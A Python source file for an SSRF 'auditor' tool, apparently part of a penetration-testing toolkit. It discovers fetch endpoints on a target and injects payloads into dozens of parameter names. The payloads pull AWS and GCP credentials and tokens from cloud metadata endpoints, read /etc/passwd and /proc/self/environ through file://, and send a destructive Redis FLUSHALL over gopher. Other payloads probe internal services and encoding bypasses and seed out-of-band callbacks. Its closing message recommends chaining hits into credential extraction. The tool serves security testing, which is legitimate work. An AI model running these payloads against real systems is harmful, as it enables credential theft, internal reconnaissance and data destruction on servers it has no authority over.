#!/usr/bin/env python3
"""
ssrf_probe.py — Server-Side Request Forgery Auditor.

Detection vectors:
  1. Cloud metadata endpoints (AWS, GCP, Azure, Oracle, DigitalOcean)
  2. Internal network probes (localhost, RFC 1918, link-local)
  3. Redirect-chain SSRF (open-redirect → internal target)
  4. Alternative schema: file://, gopher://, dict://, ftp://
  5. Blind OOB mode: injects a callback URL and watches for a DNS/HTTP pingback
  6. IPv6 / IPv4-mapped encoding bypass (%5B::1%5D, 0177.0.0.1, 0x7f000001)
  7. 30+ SSRF-prone field names across POST bodies and GET parameters

Usage:
    python TOOLS/ssrf_probe.py --url http://localhost:3456
    python TOOLS/ssrf_probe.py --url https://target.com --oob http://your.burpcollaborator.net
    python TOOLS/ssrf_probe.py --url http://target.com --schema file
"""
import argparse
import os
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, DEFAULT_TARGET_BASE

# ---------------------------------------------------------------------------
# SSRF-prone field names (POST body keys and GET parameter names)
# ---------------------------------------------------------------------------
FIELDS = [
    # Generic fetch/proxy fields
    "url", "uri", "target", "endpoint", "link", "src", "href", "path",
    "file", "fetch", "proxy", "redirect", "callback", "return", "returnUrl",
    "return_url", "next", "continue", "destination", "dest", "location",
    "image", "imageUrl", "image_url", "avatar", "avatarUrl", "avatar_url",
    "logo", "logoUrl", "logo_url", "thumbnail", "thumb", "icon", "iconUrl",
    "feed", "feedUrl", "feed_url", "webhook", "webhookUrl", "webhook_url",
    "api", "apiUrl", "api_url", "service", "serviceUrl", "service_url",
    "host", "hostname", "domain", "site", "resource", "source", "data",
    "content", "document", "template", "templateUrl", "template_url",
    "import", "importUrl", "import_url", "export", "exportUrl", "export_url",
    "download", "downloadUrl", "download_url", "open", "ref",
]

# ---------------------------------------------------------------------------
# Cloud/internal metadata targets
# ---------------------------------------------------------------------------
METADATA_TARGETS = {
    # AWS IMDSv1 (no token required)
    "aws-imds-meta":    "http://169.254.169.254/latest/meta-data/",
    "aws-imds-creds":   "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws-imds-userdata":"http://169.254.169.254/latest/user-data",
    "aws-imds-token":   "http://169.254.169.254/latest/api/token",  # IMDSv2 — 404 without PUT
    # AWS via IPv6-mapped form
    "aws-imds-v6":      "http://[::ffff:169.254.169.254]/latest/meta-data/",
    # GCP metadata
    "gcp-meta":         "http://metadata.google.internal/computeMetadata/v1/",
    "gcp-token":        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure IMDS
    "azure-meta":       "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Oracle Cloud
    "oci-meta":         "http://169.254.169.254/opc/v1/instance/",
    # DigitalOcean
    "do-meta":          "http://169.254.169.254/metadata/v1.json",
    # Alibaba Cloud
    "ali-meta":         "http://100.100.100.200/latest/meta-data/",
    # Kubernetes
    "k8s-api":          "https://kubernetes.default.svc/api/",
    "k8s-api-http":     "http://kubernetes.default.svc/api/",
    "k8s-etcd":         "http://127.0.0.1:2379/version",
    # Docker daemon
    "docker-sock-http": "http://localhost:2375/version",
    "docker-sock-alt":  "http://127.0.0.1:2375/containers/json",
    # localhost internal services
    "localhost-6379":   "http://localhost:6379/",   # Redis
    "localhost-5432":   "http://localhost:5432/",   # Postgres
    "localhost-3306":   "http://localhost:3306/",   # MySQL
    "localhost-9200":   "http://localhost:9200/",   # Elasticsearch
    "localhost-27017":  "http://localhost:27017/",  # MongoDB
    "localhost-8080":   "http://localhost:8080/",   # Alt HTTP
    "localhost-8443":   "http://localhost:8443/",   # Alt HTTPS
}

# IPv4/IPv6 encoding bypass variants of 127.0.0.1
LOCALHOST_VARIANTS = [
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0177.0.0.1/",           # octal
    "http://0x7f000001/",           # hex
    "http://2130706433/",           # decimal
    "http://[::ffff:127.0.0.1]/",   # IPv4-mapped IPv6
    "http://localhost/",
    "http://LOCALHOST/",
    "http://localtest.me/",         # resolves to 127.0.0.1
    "http://127.1/",                # short form
    "http://127.0.1/",
]

# Alternative schema payloads (many backends strip http:// but pass these)
SCHEMA_PAYLOADS = {
    "file":   ["file:///etc/passwd", "file:///etc/hosts", "file:///proc/self/environ",
               "file:///windows/win.ini"],
    "gopher": ["gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall%0d%0a",  # Redis FLUSHALL
               "gopher://127.0.0.1:9200/_search"],
    "dict":   ["dict://127.0.0.1:6379/info", "dict://localhost:11211/stats"],    # Memcached
    "ftp":    ["ftp://127.0.0.1/"],
}

# Evidence patterns in SSRF responses
SSRF_EVIDENCE = (
    # Cloud metadata artifacts
    "ami-id", "instance-id", "placement", "security-credentials",
    "iam", "metadata", "computeMetadata",
    # Linux /etc/passwd
    "root:x:0:", "/bin/bash", "/bin/sh", "/sbin/nologin",
    # Windows
    "for 16-bit app support",
    # Service banners
    "redis_version", "Redis", "PONG",
    "elasticsearch", "you know, for search",
    "MongoDB", "mongod",
    "PostgreSQL", "MySQL",
    # Connection artifacts that confirm fetch happened
    "Connection refused", "ECONNREFUSED",
    "failed to fetch", "SSRFError",
    "getaddrinfo", "ETIMEDOUT",
    "Network is unreachable",
    # Docker
    "DockerVersion", "ApiVersion",
    # Kubernetes
    "kubernetes", "k8s",
)

CANARY_PATH = "/vibe-ssrf-canary-probe-9f3a"


class SSRFProbe(VibeTool):
    def __init__(self):
        super().__init__("SSRF Probe", "Server-Side Request Forgery Auditor")
        self.hits: list[dict] = []

    def _is_ssrf_evidence(self, body: str, status: int) -> str | None:
        """Return first matched evidence string, or None."""
        body_lower = (body or "").lower()
        for sig in SSRF_EVIDENCE:
            if sig.lower() in body_lower:
                return sig
        return None

    def _probe(self, ep: str, field: str, ssrf_url: str, method: str = "POST") -> dict | None:
        """Send one SSRF payload and return a hit dict or None."""
        if method == "GET":
            parsed = urllib.parse.urlparse(ep)
            q = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            q[field] = ssrf_url
            full = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))
            status, body, hdrs = self.safe_request(full, method="GET")
        else:
            status, body, hdrs = self.safe_request(ep, method="POST", data={field: ssrf_url})

        body = body or ""
        evidence = self._is_ssrf_evidence(body, status)
        if evidence:
            hit = {
                "endpoint": ep,
                "field": field,
                "ssrf_url": ssrf_url,
                "status": status,
                "evidence": evidence,
                "snippet": body[:300],
                "method": method,
            }
            self.hits.append(hit)
            self.log(
                f"SSRF HIT: {method} {ep} field={field!r} → {ssrf_url}\n"
                f"  evidence='{evidence}' status={status}\n"
                f"  snippet: {body[:160]}",
                "hack",
            )
            self.record_finding(
                title=f"SSRF via {field} field ({evidence!r} in response)",
                severity="critical",
                location=ep,
                evidence=(
                    f"Injected URL: {ssrf_url}\n"
                    f"Evidence: '{evidence}' found in HTTP {status} response.\n"
                    f"Preview: {body[:200]}"
                ),
                recommendation=(
                    "Implement a strict SSRF allowlist for any user-controlled URL fetch. "
                    "Block cloud metadata IP ranges (169.254.169.254, fd00:ec2::254) at the network layer. "
                    "Disable IMDSv1 and require IMDSv2 token on AWS."
                ),
                cwe="CWE-918",
                owasp="A10:2021-Server-Side Request Forgery",
            )
            return hit
        return None

    def _discover_fetch_endpoints(self, base: str) -> list[tuple[str, str]]:
        """
        Return (endpoint_url, preferred_method) pairs for all plausible fetch
        endpoints on the target. Checks a known list + falls back to base URL.
        """
        candidates = [
            (f"{base}/api/fetch",   "POST"),
            (f"{base}/api/proxy",   "POST"),
            (f"{base}/api/url",     "POST"),
            (f"{base}/api/image",   "POST"),
            (f"{base}/api/download","POST"),
            (f"{base}/api/import",  "POST"),
            (f"{base}/api/export",  "POST"),
            (f"{base}/api/webhook", "POST"),
            (f"{base}/api/preview", "POST"),
            (f"{base}/api/scrape",  "POST"),
            (f"{base}/api/render",  "POST"),
            (f"{base}/fetch",       "POST"),
            (f"{base}/proxy",       "POST"),
            (f"{base}/redirect",    "GET"),
            (f"{base}/url",         "GET"),
            (f"{base}/open",        "GET"),
        ]
        live = []
        for ep, method in candidates:
            st, _, _ = self.safe_request(ep, method="GET")
            if st not in (0, 404, 410):
                live.append((ep, method))
                self.log(f"Found live fetch endpoint: {ep} ({method})", "info")
        if not live:
            # Fallback: test the base URL itself with GET params
            live = [(f"{base}/", "GET")]
        return live

    def _test_cloud_metadata(self, endpoints: list[tuple[str, str]]) -> None:
        self.log("=== CLOUD METADATA TARGETS ===")
        for name, meta_url in METADATA_TARGETS.items():
            for ep, method in endpoints:
                for field in FIELDS[:12]:  # top 12 most common
                    hit = self._probe(ep, field, meta_url, method=method)
                    if hit:
                        return  # one confirmed hit is enough to validate the vector

    def _test_localhost_variants(self, endpoints: list[tuple[str, str]]) -> None:
        self.log("=== LOCALHOST ENCODING BYPASS ===")
        canary_url = "http://localhost:9/vibe-ssrf-canary"
        for lv in LOCALHOST_VARIANTS:
            for ep, method in endpoints:
                for field in FIELDS[:8]:
                    self._probe(ep, field, lv, method=method)
                    self._probe(ep, field, lv + CANARY_PATH, method=method)

    def _test_schemas(self, endpoints: list[tuple[str, str]], enabled_schemas: list[str]) -> None:
        self.log("=== ALTERNATIVE SCHEMA INJECTION ===")
        for schema, payloads in SCHEMA_PAYLOADS.items():
            if enabled_schemas and schema not in enabled_schemas:
                continue
            for payload_url in payloads:
                for ep, method in endpoints:
                    for field in FIELDS[:8]:
                        self._probe(ep, field, payload_url, method=method)

    def _test_oob(self, endpoints: list[tuple[str, str]], oob_url: str) -> None:
        """
        Blind OOB test: inject an attacker-controlled callback URL.
        The tool can't observe the pingback directly — this seeds the payload;
        watch your Burp Collaborator / interactsh / canarytokens listener.
        """
        self.log(f"=== BLIND OOB SSRF (callback: {oob_url}) ===")
        self.log("Watch your OOB listener — the tool won't observe DNS/HTTP pingbacks.", "info")
        oob_variations = [
            oob_url,
            oob_url + CANARY_PATH,
            # Redirect chain: open-redirect on target → OOB
            f"http://localhost/?url={urllib.parse.quote(oob_url)}",
        ]
        for oob in oob_variations:
            for ep, method in endpoints:
                for field in FIELDS[:15]:
                    self._probe(ep, field, oob, method=method)

    def run(self, base_url: str, oob_url: str = "", schemas: list[str] | None = None):
        self.banner()
        base = base_url.rstrip("/")
        self.log(f"SSRF audit: {base}")

        endpoints = self._discover_fetch_endpoints(base)
        self.log(f"Testing {len(endpoints)} fetch endpoint(s) × {len(FIELDS)} fields")

        self._test_cloud_metadata(endpoints)
        self._test_localhost_variants(endpoints)
        self._test_schemas(endpoints, schemas or [])

        if oob_url:
            self._test_oob(endpoints, oob_url)

        self.log("=" * 48)
        if self.hits:
            self.log(
                f"SSRF CONFIRMED — {len(self.hits)} hit(s). "
                "Chain with cloud metadata extraction or internal port scan.",
                "hack",
            )
            for h in self.hits:
                self.log(f"  {h['method']} {h['endpoint']} [{h['field']}] → {h['ssrf_url']}", "crit")
        else:
            self.log(
                "No SSRF evidence found. "
                "Try --oob <collaborator-url> for blind out-of-band detection.",
                "info",
            )
        return self.hits


def main(argv=None):
    p = argparse.ArgumentParser(
        description="SSRF Probe — Server-Side Request Forgery Auditor"
    )
    p.add_argument("--url", default=DEFAULT_TARGET_BASE, help="Target base URL")
    p.add_argument(
        "--oob", default="",
        help="Blind OOB callback URL (Burp Collaborator / interactsh / canarytokens). "
             "Payloads are sent; watch your listener for DNS/HTTP pingbacks.",
    )
    p.add_argument(
        "--schema", action="append", dest="schemas", default=[],
        help="Enable alternative schema (file, gopher, dict, ftp). Repeatable.",
    )
    p.add_argument("-v", "--version", action="version", version="SSRF Probe 2.0.0")
    args = p.parse_args(argv)
    SSRFProbe().run(args.url, oob_url=args.oob, schemas=args.schemas)


if __name__ == "__main__":
    sys.exit(main())
